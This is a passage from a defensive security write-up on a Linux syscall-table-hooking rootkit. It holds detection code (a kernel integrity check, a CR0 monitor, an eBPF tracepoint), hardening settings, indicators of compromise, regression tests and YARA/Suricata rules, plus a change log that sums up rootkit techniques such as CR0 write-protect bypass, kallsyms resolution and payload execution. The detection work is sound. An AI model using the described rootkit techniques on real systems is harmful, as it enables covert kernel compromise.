v1.1's `get_expected_syscall_addr()` had no defined source. If expectations
are resolved from the *live* `/proc/kallsyms`, the rootkit's §8.2 tampering
poisons the baseline — circular trust. Expected values **must** come from:
the on-disk vmlinux matched by build-id, a boot-time snapshot taken before
network exposure, or a hypervisor/offline scan. [F-32]

```c
/* Module-side resolution on 5.7+ uses the same kprobe trick as §4.3
 * (kallsyms_lookup_name is unexported there — v1.1's detection code
 * could not link on its own 5.15 test kernel).                    [F-02]
 * The v1.1 probe of unexported _text/_etext is likewise replaced with
 * resolution via kallsyms.                                        [F-38] */

static int check_syscall_integrity(const unsigned long *expected, int n)
{
    unsigned long sct;
    int i, hooked = 0;

    if (resolve_sct_for_detection(&sct))
        return -1;

    for (i = 0; i < n; i++) {
        unsigned long entry =
            ((const unsigned long *)sct)[i];

        if (entry != expected[i]) {
            /* %p is HASHED since 4.15 — a forensic alert that hashes the
             * pointer is useless. Store raw values and resolve offline,
             * or use %px only over a trusted/locked-down channel. [F-37] */
            pr_alert("SCT MISMATCH nr=%d handler=%px expected=%px\n",
                     i, (void *)entry, (void *)expected[i]);
            hooked = 1;
        }
    }
    return hooked;
}
```

### 9.2 CR0 and Remap Monitoring — fixed

v1.1 kprobed `write_cr0` to catch WP toggles, but v1.1's *own attack* wrote
CR0 with inline `asm volatile` — invisible to any kprobe. There is no
`write_cr0` call to intercept, and CR4-style bit pinning does not cover
CR0.WP. Effective controls: [F-30]

```c
/* (a) Poll WP from a monitor kthread — catches raw asm toggles. */
static int cr0_monitor(void *unused)
{
    while (!kthread_should_stop()) {
        if (!(read_cr0() & X86_CR0_WP))
            alert("CR0.WP cleared");
        schedule_timeout_interruptible(HZ);
    }
    return 0;
}
/* (b) Hypervisor CR_ACCESS exits (KVM traps CR0/CR4 writes from guests).
 * (c) Hardware watchpoints on the SCT pages (debug registers).
 * (d) kprobe memremap/ioremap (v1.1 missed memremap — the modern API for
 *     mapping System RAM), range-checked against __pa_symbol(sys_call_table). */
```

### 9.3 Threshold-Evasion Monitoring — replaced

v1.1's exact-value heuristic (`threshold+1/+16/+256`) is bypassed by `+17`
and false-positives on legitimate power-of-two I/O. v2.0's bounded scanning
removed the skip path that created the bypass; the residual gap (bytes
beyond `MAX_SCAN_PER_CALL`) is better monitored with a per-process size
distribution histogram (eBPF) and percentile drift analysis than with magic
constants.

### 9.4 eBPF Detection — rewritten on a stable attach point

v1.1 kprobed `do_syscall_64` (signature changed in 4.17; arg binding
fragile) and hardcoded `SCT_ADDRESS` at compile time — dead under KASLR,
which changes the address every boot. Correct construction: stable
`raw_syscalls/sys_enter` tracepoint, SCT address supplied at load time via
map, expected values from the trusted anchor, and sampling (a full
per-syscall table probe is needless overhead). [F-31]

```c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

struct event { u32 nr; u64 actual; u64 expected; u32 pid; u64 ts; };

struct { __uint(type, BPF_MAP_TYPE_RINGBUF);
         __uint(max_entries, 256 * 1024); } events SEC(".maps");

/* Populated by the loader at attach time, per boot (KASLR):
 *   key 0 → sys_call_table address, resolved from /proc/kallsyms under
 *   CAP_SYSLOG, or better from offline BTF/vmlinux.                  */
struct { __uint(type, BPF_MAP_TYPE_ARRAY);
         __uint(max_entries, 1);
         __type(key, u32); __type(value, u64); } cfg SEC(".maps");

/* Trusted-anchor expectations (§9.1), not live-host resolutions. */
struct { __uint(type, BPF_MAP_TYPE_HASH);
         __uint(max_entries, 512);
         __type(key, u32); __type(value, u64); } expected SEC(".maps");

SEC("tracepoint/raw_syscalls/sys_enter")
int on_sys_enter(struct trace_event_raw_sys_enter *ctx)
{
    u32 nr = (u32)ctx->id, zero = 0;
    u64 *sctp, *exp, actual = 0;
    struct event *e;

    if (bpf_get_prandom_u32() & 4095)      /* sample 1/4096 */
        return 0;

    sctp = bpf_map_lookup_elem(&cfg, &zero);
    if (!sctp || !*sctp)
        return 0;
    exp = bpf_map_lookup_elem(&expected, &nr);
    if (!exp)
        return 0;

    bpf_probe_read_kernel(&actual, sizeof(actual),
                          (void *)(*sctp + (u64)nr * sizeof(void *)));

    if (actual && actual != *exp) {
        e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
        if (e) {
            e->nr = nr; e->actual = actual; e->expected = *exp;
            e->pid = bpf_get_current_pid_tgid() >> 32;
            e->ts = bpf_ktime_get_ns();
            bpf_ringbuf_submit(e, 0);
        }
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

---

## 10. Countermeasures

### 10.1 Kernel Configuration (corrected names and removals)

```
CONFIG_MODULES=n                              # or:
CONFIG_MODULE_SIG=y + CONFIG_MODULE_SIG_FORCE=y
CONFIG_STRICT_KERNEL_RWX=y                   # DEBUG_RODATA renamed in 4.11 [F-33]
CONFIG_STRICT_MODULE_RWX=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_STRICT_DEVMEM=y
CONFIG_IO_STRICT_DEVMEM=y
CONFIG_SECURITY_LOCKDOWN_LSM=y               # lockdown=integrity on cmdline
CONFIG_HARDENED_USERCOPY=y
CONFIG_FINEIBT=y | CONFIG_CFI_CLANG=y        # 6.2+ / clang-built
# sysctls: kernel.kptr_restrict=1 (2 to hide from CAP_SYSLOG too)
#          kernel.dmesg_restrict=1
#
# REMOVED from v1.1 (not real controls):
#   - "kallsyms_restrict" sysctl (does not exist; the mechanism is
#     kptr_restrict + CAP_SYSLOG)
#   - CONFIG_PHYS_ADDR_T_64BIT listed as hardening (architecture requirement)
#   - CONFIG_DEBUG_RODATA (superseded name)
#   - CONFIG_PAGE_TABLE_ISOLATION as an SCT-hooking impediment (it is a
#     Meltdown mitigation; unrelated to syscall table writes)
```

### 10.2 Runtime Protection

- **Assert RO at boot** and keep a snapshot of SCT contents + kallsyms
  (trusted anchor, §9.1) taken by an early, network-disabled init.
- v1.1's `set_memory_ro()` "countermeasure" is a no-op: the pages are
  already RO; the attack bypasses RO-ness via CR0/PTE tricks, which
  re-asserting RO does not prevent. Retained only as boot hygiene. [F-33]
- v1.1's `panic()` on detection is a **DoS amplifier** — an attacker who can
  induce a false integrity alert turns detection into downtime. Correct
  response: alert to an external sink, snapshot memory (kdump), contain
  (lockdown already blocks further module loads). [F-33]
- Hypervisor-side monitoring: CR_ACCESS exits, EPT page-protection on SCT
  pages, offline memory introspection.

### 10.3 Protection Evolution (corrected)

| Era | Change | Effect on this technique |
|---|---|---|
| ≤ 2.6.18 | writable SCT | trivial |
| RODATA → `CONFIG_STRICT_KERNEL_RWX` (4.11 rename) | table RO | CR0/PTE tricks required |
| 5.7 | `kallsyms_lookup_name` unexported | kprobe trick (itself an IOC) |
| 5.11+ (distro) | lockdown integrity mode | unsigned module loads blocked |
| 5.12 / 6.2 | KCFI / FineIBT | indirect-call target constraints |
| ~6.12 (verify) | x86_64 switch-based dispatch | native SCT hooking ineffective |
| CET/SHSTK | **user-mode** shadow stacks; kernel shadow stacks are not mainline — v1.1's "6.2+ shadow stacks" row overstated this | [F-33] |

---

## 11. Indicators of Compromise (updated)

### 11.1 Memory IOCs

| Indicator | Detection |
|---|---|
| SCT entry outside kernel text / mismatched vs trusted anchor | §9.1 |
| CR0.WP cleared (any duration) | polling, hypervisor CR exits (§9.2) |
| `kprobe` registration on `kallsyms_lookup_name` **new** [F-02] | tracefs kprobes listing |
| `memremap`/`ioremap` covering SCT physical page | kprobe + range check |
| Unaccounted writable kernel pages / W^X violations | page walks, offline scans |

### 11.2 Behavioral IOCs

| Indicator | Detection |
|---|---|
| Syscall latency (per-syscall, sampled) | eBPF timing histograms |
| `call_usermodehelper` from unusual context **new** [F-22] | audit, tracepoint |
| Cred change in long-lived unprivileged service | auditd / `/proc/<pid>/status` |
| Kernel-originated sockets | conntrack, netfilter logging |

### 11.3 Artifact IOCs

| Indicator | Detection |
|---|---|
| Module in `/sys/module` but absent from `/proc/modules` **new** [F-34] | list diff |
| GPL-licensed module with no on-disk file | lsmod + filesystem cross-check |
| On-disk kernel vs running kernel mismatch | build-id comparison |

---

## 12. Testing Methodology (regression suite for v1.1's defects)

Environment as v1.1 §12.1 (isolated VM, 5.15-era kernel — deliberately
representative of the surviving threat surface), plus a ≥6.12 VM to confirm
the technique is inert there.

| Test | Regression for | Assertion |
|---|---|---|
| `test_syscall_numbers` | F-08 | hook writes land on entries 0 and 45, verified via kprobe addresses |
| `test_install_lifecycle` | F-01/07/14/15 | install → verify readback → second install returns `-EBUSY`/`-EEXIST` → uninstall with concurrent readers → no oops, table restored |
| `test_double_install_over_foreign_hook` | F-15 | pre-hook entry with foreign pointer → install aborts, no recursion |
| `test_pid_vs_tgid` | F-13 | reads from a worker thread of a targeted process (TID ≠ PID) are intercepted |
| `test_split_magic_within_read` | F-36 | magic straddling an 8 KB window boundary inside one read **is** detected |
| `test_split_magic_across_reads` | F-36 (documented) | magic split over two reads is not detected — assert documented behavior + log entry |
| `test_beyond_scan_cap` | F-17/20 | magic at 1.5 MB offset in a 2 MB read is not scanned — assert logged skip (CPU-bound tradeoff) |
| `test_admission_bounds` | F-11/16/17/19 | 1000 concurrent target reads: inspection memory ≤ MAX_INFLIGHT_BYTES + windows; no OOM; hook does not permanently self-disable (v1.1 did, within minutes) |
| `test_drop_semantics` | F-21 | drop path returns 0; client observes EOF/protocol error — assert the event is *visible* (loud), contradicting "silent drop" |
| `test_payload_not_inline` | F-22 | triggering read returns promptly; usermodehelper executes from kworker context |
| `test_compat_and_io_uring` | §5.6 | 32-bit binary and io_uring reads are NOT intercepted — assert documented coverage gap |
| `test_detection_suite` | F-02/30/31/32/37 | §9 detects the hook within its polling window, using offline trusted anchor |

---

## 13. References

1. Hoglund & Butler, *Rootkits: Subverting the Linux Kernel* (Addison-Wesley, 2005) — foundational SCT-hooking reference.
2. MITRE ATT&CK: T1014 (Rootkit), T1179 (Intercepting Web Traffic — note: modern T1179 is dominated by TLS-terminating proxies/CA abuse, not SCT hooks).
3. Linux source: `arch/x86/entry/syscall_64.tbl`, `arch/x86/entry/syscall_32.c` (`ia32_sys_call_table`), `kernel/kallsyms.c` (unexported `kallsyms_lookup_name` since v5.7).
4. Tools: rkhunter, chkrootkit, Lynis, Volatility (offline), bcc/libbpf, crash/LiME.

---

## Appendix A: System Call Numbers (corrected)

| Architecture | read | write | recvfrom | readv | Notes |
|---|---|---|---|---|---|
| x86_64 | 0 | 1 | **45** | **19** | x32 entries ≥ 512 share the table; compat processes use `ia32_sys_call_table` |
| i386 | 3 | 4 | **no direct syscall** | 145 | `recvfrom` via `socketcall(102)` sub-op 12; 292 on i386 is `inotify_add_watch` |
| ARM32 (EABI) | 3 | 4 | 292 | 145 | OABI uses `socketcall` |
| ARM64 | 63 | 64 | 207 | 65 | |
| RISC-V | 63 | 64 | 207 | 65 | |

v1.1 errors: x86_64 recvfrom listed as 62 (kill) and 59 (execve) in different
sections; readv listed as 65 (semctl) and 63 (uname) likewise; i386
`recvfrom=292` copied from the ARM EABI table. [F-08]

## Appendix B: Magic Examples and Detection Rules

```
# YARA (memory dumps) — unchanged, valid:
rule SyscallHook_Magic_LABRA {
    strings:
        $magic1 = { 7F 4C 41 42 52 41 00 00 00 00 00 00 00 00 00 00 }
    condition:
        $magic1
}

# Suricata — v1.1 matched a TLS certificate subject against what is an
# HTTP-header trigger; the two halves did not correspond. Corrected to
# cleartext HTTP only (TLS content is not visible to a network sensor): [F-41]
alert http any any -> any any (msg:"Rootkit trigger header present";
    http_header; content:"X-Magic|3a| TRIGGER";
    classtype:trojan-activity; sid:1000001; rev:2;)
```

Magic lengths: raw header = 16 bytes; `"X-Magic: TRIGGER\r\n"` = **18** bytes
(v1.1's fixed `MAGIC_LENGTH 16` could not hold it; `magic_len` now governs). [F-25]

## Appendix C: Change Log (v1.1 → v2.0)

| ID | Fix | Section |
|---|---|---|
| F-01 | `g_hook_cfg` never allocated/initialized; `init_size_protection` never called | 3.2, 4.2 |
| F-02 | `kallsyms_lookup_name` unexported ≥5.7 — attack *and* detection code could not link; kprobe resolution added + IOC | 4.3, 9.1, 11 |
| F-03 | PTE-walk pseudocode (`...`) with no restore path removed; `set_memory_rw` specified | 4.1 |
| F-04 | physmap/ioremap alias write removed (RAM refusal, UC/WB mixed-type hazard) | 4.1 |
| F-05 | pre-2.6.39 `do_execve` kthread path removed | 6 |
| F-06 | /proc parser: no NUL termination, line-splitting misses | 4.3 |
| F-07 | pattern scan unvalidated, wrong anchor (post-4.17); validation + readback verify added | 4.2, 4.3 |
| F-08 | wrong syscall numbers (62/65/59/63; i386 292) | 3.1, 3.3, App. A |
| F-09 | nonexistent `recv` table entry / diagram | 2 |
| F-10 | `trigger_count++` non-atomic | 3.2, 6 |
| F-11 | counter reset TOCTOU (read-then-set) | 5.4 |
| F-12 | inline text hook without `stop_machine`/`text_poke` — flagged, not used | 8 |
| F-13 | `pid` vs `tgid` (worker threads missed); PID reuse; comm spoofing | 5.5 |
| F-14 | no uninstall/drain path | 4.4 |
| F-15 | no double-install guard (recursion via saved-hooked orig) | 4.2 |
| F-16 | failure path counted as allocated bytes | 5.4 |
| F-17 | cumulative counter permanently self-disables hook (no hysteresis) | 5.2, 5.4 |
| F-18 | `si.freeram` misread (healthy Linux ≈ few % free); container-blind | 5.4 |
| F-19 | 32-bit overflow `freeram*100`; wrap-unsafe offset bound | 5.3, 5.4 |
| F-20 | order-6 `kmalloc` in hot path → `kvmalloc` bounded window | 5.2 |
| F-21 | "drop packet" fiction → EOF semantics documented; unchecked `copy_to_user` → checked; clear_user race stated | 5.2 |
| F-22 | `UMH_WAIT_PROC` blocks victim read → deferred + `UMH_NO_WAIT` | 6 |
| F-23 | privesc elevates the *victim*; inline-only context; detection noted | 6 |
| F-24 | MEMEXEC vs NX — analysis-only, own IOCs | 6 |
| F-25 | fixed `MAGIC_LENGTH 16` vs 18-byte example | 3.2, App. B |
| F-26 | payload_flags enum/bitmask aliasing → separate action bits + one-hot select | 3.2 |
| F-27 | exfil sliced from offset 0 under CONTAINS mode → match-relative | 6 |
| F-28 | "regex" trigger mode that never existed; kptr_restrict/address-zeroing notes | 5.3, 4.3 |
| F-29 | rkhunter read-spoofing strawman removed (tools don't probe SCT via read) | 8 |
| F-30 | kprobe `write_cr0` can't see inline-asm CR0 writes → polling + hypervisor | 9.2 |
| F-31 | eBPF: compile-time SCT address (KASLR-dead), fragile kprobe site, per-call cost → tracepoint + map + sampling | 9.4 |
| F-32 | expected-address trust chain undefined → trusted anchor requirement | 9.1 |
| F-33 | config names (DEBUG_RODATA, bogus kallsyms_restrict/PHYS_ADDR), `set_memory_ro` no-op, `panic()` DoS, shadow-stack overstatement, PTI misclassification | 10 |
| F-34 | kallsyms hiding "fix" creates name↔addr mismatch — detection wins; module-list mismatch IOC | 8, 11 |
| F-35 | readv saved but never hooked; recvmsg/io_uring/splice/compat coverage unstated → coverage matrix | 5.6 |
| F-36 | magic split across windows/reads → window overlap + documented limitation | 5.2 |
| F-37 | `%p` hashing (4.15+) makes forensic alerts useless → raw storage/`%px` policy | 9.1 |
| F-38 | detection uses unexported symbols (`_text`, `sys_call_table`) | 9.1 |
| F-39 | TLS ciphertext premise contradicted by own diagram → scope statement + corrected flow | 1.1, 7 |
| F-40 | compat (ia32) / x32 separate dispatch | 3.1, App. A |
| F-41 | Suricata rule matched cert subject against an HTTP-header trigger | App. B |
| — | dead fields removed (`payload_fn`, `MAGIC_SIG`, `orig_sys_readv` usage, `REQUIRED_TRIGGERS` now defined), stack locals in trigger handler | 3.2, 6 |

*Document Version: 2.0*
*Classification: Defensive Security Research*